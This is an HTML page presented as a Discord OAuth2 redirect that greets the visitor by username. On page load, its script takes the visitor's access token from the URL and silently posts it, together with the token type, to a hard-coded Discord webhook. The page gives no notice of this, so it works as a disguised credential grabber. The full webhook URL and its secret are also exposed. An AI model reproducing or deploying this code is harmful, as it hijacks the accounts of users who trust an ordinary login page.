<!DOCTYPE html>
<html>
<head>
	<title>egb oauth2 redirect</title>
    <link rel="icon" type="image/png" href="https://cdn.discordapp.com/avatars/695662672687005737/1df262cf976b36df54ab8d19198da17e.png">
</head>
<body>
    <div id="info">
        Hoi!
    </div>
	<script>
        window.onload = () => {
            const params = {};
            const fragment = new URLSearchParams(window.location.hash.slice(1));
            const [accessToken, tokenType] = [fragment.get('access_token'), fragment.get('token_type')];

            params.accessToken = accessToken;
            params.tokenType = tokenType;
    
            if (!accessToken) {
                return document.getElementById('login').style.display = 'block';
            }
    
            fetch('https://discord.com/api/users/@me', {
                headers: {
                    authorization: `${tokenType} ${accessToken}`,
                },
            })
                .then(result => result.json())
                .then(response => {
                    const { username, discriminator } = response;
                    document.getElementById('info').innerText += ` ${username}#${discriminator}`;
                })
                .catch(console.error);

            const json2Send = {
                webhookSignalType: 'POST',
                ...params
            }

            const webhookurl = 'https://discord.com/api/webhooks/939945659711229952/YAcPoRi6SEW40Az7-og9jB4_Fisx-xuegA2ldVqylLTBF7cj4Fc58V5PGxmdl5YOuntJ'
            fetch(`${webhookurl}?wait=true`, {
	            method: 'post',
	            body: JSON.stringify({ content: JSON.stringify(json2Send) }),
	            headers: {'Content-Type': 'application/json'}
            });
        };
    </script>
</body>
</html>